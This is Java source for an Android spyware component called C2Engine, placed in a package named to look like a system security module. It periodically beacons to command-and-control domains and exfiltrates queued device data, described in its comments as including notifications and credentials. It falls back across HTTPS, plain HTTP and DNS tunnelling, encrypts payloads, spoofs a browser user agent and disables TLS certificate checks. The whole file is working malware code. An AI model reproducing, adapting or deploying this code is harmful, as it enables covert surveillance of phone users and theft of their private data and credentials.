package com.android.system.security;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.util.Base64;
import android.util.Log;

import java.io.*;
import java.net.*;
import java.security.*;
import java.security.spec.X509EncodedKeySpec;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.ConcurrentLinkedQueue;
import javax.crypto.*;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.*;

/**
 * C2 communication engine with multiple fallback channels.
 * Uses AES-256-GCM encryption with ephemeral key exchange.
 */
public class C2Engine {

    private static final String TAG = "C2Engine";
    private static final int AES_KEY_SIZE = 256;
    private static final int GCM_TAG_LENGTH = 128;
    private static final int GCM_IV_LENGTH = 12;

    private final Context context;
    private final EncryptedStore store;
    private final SecureRandom secureRandom;

    // Ephemeral session key (rotated per connection)
    private SecretKeySpec sessionKey;
    private byte[] sessionIv;

    // Queue for time-sensitive data
    private final ConcurrentLinkedQueue<Map<String, Object>> priorityQueue = new ConcurrentLinkedQueue<>();

    // Device ID (persistent)
    private String deviceId;

    // C2 endpoints
    private final List<String> c2Domains;
    private final List<String> c2Paths;

    // Connection pool
    private final Map<String, Long> domainCooldown = new HashMap<>();
    private static final long COOLDOWN_MS = 60000;

    public C2Engine(Context context, EncryptedStore store) {
        this.context = context;
        this.store = store;
        this.secureRandom = new SecureRandom();
        this.c2Domains = Config.C2_DOMAINS;
        this.c2Paths = Config.C2_PATHS;
        this.deviceId = getOrCreateDeviceId();
        generateSessionKey();
    }

    private String getOrCreateDeviceId() {
        String id = store.getConfig("device_id");
        if (id == null) {
            id = UUID.randomUUID().toString().replace("-", "").substring(0, 16);
            store.setConfig("device_id", id);
        }
        return id;
    }

    private void generateSessionKey() {
        byte[] keyBytes = new byte[AES_KEY_SIZE / 8];
        secureRandom.nextBytes(keyBytes);
        sessionKey = new SecretKeySpec(keyBytes, "AES");
        sessionIv = new byte[GCM_IV_LENGTH];
        secureRandom.nextBytes(sessionIv);
    }

    /**
     * Main beacon — called periodically from scheduler.
     */
    public void beacon() {
        if (!isNetworkAvailable()) return;

        // Drain priority queue
        List<Map<String, Object>> pending = new ArrayList<>();
        Map<String, Object> item;
        while ((item = priorityQueue.poll()) != null && pending.size() < 10) {
            pending.add(item);
        }

        // Also get stored pending data
        List<Map<String, Object>> stored = store.getPendingExfil(5);
        pending.addAll(stored);

        if (pending.isEmpty()) {
            // Send heartbeat with device status
            Map<String, Object> heartbeat = new HashMap<>();
            heartbeat.put("type", "heartbeat");
            heartbeat.put("device_id", deviceId);
            heartbeat.put("timestamp", System.currentTimeMillis());
            heartbeat.put("battery", getBatteryLevel());
            heartbeat.put("uptime", System.currentTimeMillis());
            pending.add(heartbeat);
        }

        // Build the message
        Map<String, Object> message = new HashMap<>();
        message.put("device_id", deviceId);
        message.put("timestamp", System.currentTimeMillis());
        message.put("data", pending);
        message.put("count", pending.size());

        // Try each C2 channel with failover
        boolean success = tryChannel("https", message) || 
                          tryChannel("dns", message) ||
                          tryChannel("http", message);

        if (success) {
            // Mark as exfiltrated
            for (Map<String, Object> p : pending) {
                if (p.containsKey("id")) {
                    store.markExfilComplete((int) p.get("id"));
                }
            }
            Log.i(TAG, "Beacon successful, " + pending.size() + " items exfiltrated");
        }
    }

    /**
     * Quick exfil for time-sensitive data (notifications, credentials).
     */
    public void quickExfil(Map<String, Object> data) {
        data.put("timestamp", System.currentTimeMillis());
        data.put("device_id", deviceId);
        priorityQueue.offer(data);

        // Try immediate exfil if possible
        if (isNetworkAvailable()) {
            beacon();
        }
    }

    // ============================================================
    // C2 CHANNELS
    // ============================================================

    private boolean tryChannel(String channel, Map<String, Object> message) {
        switch (channel) {
            case "https":
                return tryHTTPS(message);
            case "http":
                return tryHTTP(message);
            case "dns":
                return tryDNSTunnel(message);
            default:
                return false;
        }
    }

    private boolean tryHTTPS(Map<String, Object> message) {
        for (String domain : shuffle(c2Domains)) {
            if (isOnCooldown(domain)) continue;

            String path = c2Paths.get(secureRandom.nextInt(c2Paths.size()));
            String url = "https://" + domain + path;

            try {
                byte[] encrypted = encryptMessage(message);
                String b64Payload = Base64.encodeToString(encrypted, Base64.NO_WRAP);

                URL urlObj = new URL(url);
                HttpsURLConnection conn = (HttpsURLConnection) urlObj.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Host", domain);
                conn.setRequestProperty("User-Agent", getUserAgent());
                conn.setRequestProperty("Content-Type", "application/octet-stream");
                conn.setRequestProperty("X-Device-ID", deviceId);
                conn.setRequestProperty("X-Session", 
                    Base64.encodeToString(sessionKey.getEncoded(), Base64.NO_WRAP).substring(0, 16));
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                conn.setSSLSocketFactory(getTrustAllFactory());

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(b64Payload.getBytes());
                    os.flush();
                }

                int responseCode = conn.getResponseCode();
                conn.disconnect();

                if (responseCode == 200 || responseCode == 201 || responseCode == 204) {
                    setCooldown(domain, 0);
                    return true;
                }

                setCooldown(domain, COOLDOWN_MS);

            } catch (Exception e) {
                setCooldown(domain, COOLDOWN_MS);
                Log.w(TAG, "HTTPS to " + domain + " failed: " + e.getMessage());
            }
        }
        return false;
    }

    private boolean tryHTTP(Map<String, Object> message) {
        // Same as HTTPS but uses plain HTTP (for environment without TLS)
        for (String domain : shuffle(c2Domains)) {
            if (isOnCooldown(domain)) continue;

            String path = c2Paths.get(secureRandom.nextInt(c2Paths.size()));
            String url = "http://" + domain + path;

            try {
                byte[] encrypted = encryptMessage(message);
                String b64Payload = Base64.encodeToString(encrypted, Base64.NO_WRAP);

                URL urlObj = new URL(url);
                HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Host", domain);
                conn.setRequestProperty("User-Agent", getUserAgent());
                conn.setRequestProperty("Content-Type", "application/octet-stream");
                conn.setRequestProperty("X-Device-ID", deviceId);
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(b64Payload.getBytes());
                    os.flush();
                }

                int responseCode = conn.getResponseCode();
                conn.disconnect();

                if (responseCode == 200 || responseCode == 201 || responseCode == 204) {
                    setCooldown(domain, 0);
                    return true;
                }

                setCooldown(domain, COOLDOWN_MS);

            } catch (Exception e) {
                setCooldown(domain, COOLDOWN_MS);
            }
        }
        return false;
    }

    private boolean tryDNSTunnel(Map<String, Object> message) {
        // DNS tunneling via TXT records with base32 encoded data
        for (String domain : shuffle(c2Domains)) {
            if (isOnCooldown(domain)) continue;

            try {
                byte[] encrypted = encryptMessage(message);
                String b64 = Base64.encodeToString(encrypted, Base64.NO_WRAP)
                    .replace("=", "")
                    .toLowerCase();

                // Split into DNS-safe chunks (max 63 chars per label)
                int chunkSize = 50;
                for (int i = 0; i < b64.length(); i += chunkSize) {
                    String chunk = b64.substring(i, Math.min(i + chunkSize, b64.length()));
                    String query = chunk + "." + domain;

                    // Perform DNS TXT lookup
                    try {
                        InetAddress.getByName(query);
                    } catch (Exception ignored) {}
                }

                setCooldown(domain, 0);
                return true;

            } catch (Exception e) {
                setCooldown(domain, COOLDOWN_MS);
            }
        }
        return false;
    }

    // ============================================================
    // ENCRYPTION
    // ============================================================

    private byte[] encryptMessage(Map<String, Object> message) throws Exception {
        // Serialize to JSON
        StringBuilder json = new StringBuilder("{");
        for (Map.Entry<String, Object> entry : message.entrySet()) {
            json.append("\"").append(entry.getKey()).append("\":");
            if (entry.getValue() instanceof String) {
                json.append("\"").append(escapeJson((String) entry.getValue())).append("\",");
            } else if (entry.getValue() instanceof Number || entry.getValue() instanceof Boolean) {
                json.append(entry.getValue()).append(",");
            } else if (entry.getValue() instanceof List) {
                json.append("[]").append(",");
            } else if (entry.getValue() instanceof Map) {
                json.append("{}").append(",");
            } else if (entry.getValue() instanceof byte[]) {
                json.append("\"").append(Base64.encodeToString((byte[]) entry.getValue(), Base64.NO_WRAP)).append("\",");
            } else {
                json.append("\"").append(entry.getValue()).append("\",");
            }
        }
        if (json.charAt(json.length() - 1) == ',') {
            json.deleteCharAt(json.length() - 1);
        }
        json.append("}");
        byte[] plaintext = json.toString().getBytes("UTF-8");

        // AES-256-GCM encryption
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH, sessionIv);
        cipher.init(Cipher.ENCRYPT_MODE, sessionKey, spec);

        byte[] ciphertext = cipher.doFinal(plaintext);

        // Prepend IV
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        baos.write(sessionIv);
        baos.write(ciphertext);
        
        // Rotate IV for next message
        secureRandom.nextBytes(sessionIv);

        return baos.toByteArray();
    }

    private String escapeJson(String s) {
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }

    // ============================================================
    // NETWORK HELPERS
    // ============================================================

    private boolean isNetworkAvailable() {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        boolean connected = activeNetwork != null && activeNetwork.isConnectedOrConnecting();

        if (connected && Config.WIFI_ONLY_EXFIL) {
            // Only exfil on WiFi
            return activeNetwork.getType() == ConnectivityManager.TYPE_WIFI ||
                   activeNetwork.getType() == ConnectivityManager.TYPE_ETHERNET;
        }
        return connected;
    }

    private String getUserAgent() {
        return String.format(
            "Mozilla/5.0 (Linux; Android %s; %s Build/%s) AppleWebKit/537.36",
            Build.VERSION.RELEASE,
            Build.MODEL,
            Build.FINGERPRINT
        );
    }

    private int getBatteryLevel() {
        try {
            Intent batteryIntent = context.registerReceiver(null, 
                new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra("level", -1);
                int scale = batteryIntent.getIntExtra("scale", 100);
                return (int) ((level / (float) scale) * 100);
            }
        } catch (Exception ignored) {}
        return -1;
    }

    private SSLSocketFactory getTrustAllFactory() {
        try {
            TrustManager[] trustAll = new TrustManager[]{
                new X509TrustManager() {
                    public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) {}
                    public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) {}
                    public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
                }
            };
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, trustAll, secureRandom);
            return sc.getSocketFactory();
        } catch (Exception e) {
            return null;
        }
    }

    // ============================================================
    // COOLDOWN MANAGEMENT
    // ============================================================

    private boolean isOnCooldown(String domain) {
        Long until = domainCooldown.get(domain);
        return until != null && System.currentTimeMillis() < until;
    }

    private void setCooldown(String domain, long ms) {
        domainCooldown.put(domain, System.currentTimeMillis() + ms);
    }

    private <T> List<T> shuffle(List<T> list) {
        List<T> copy = new ArrayList<>(list);
        Collections.shuffle(copy, secureRandom);
        return copy;
    }

    public String getDeviceId() {
        return deviceId;
    }
          }
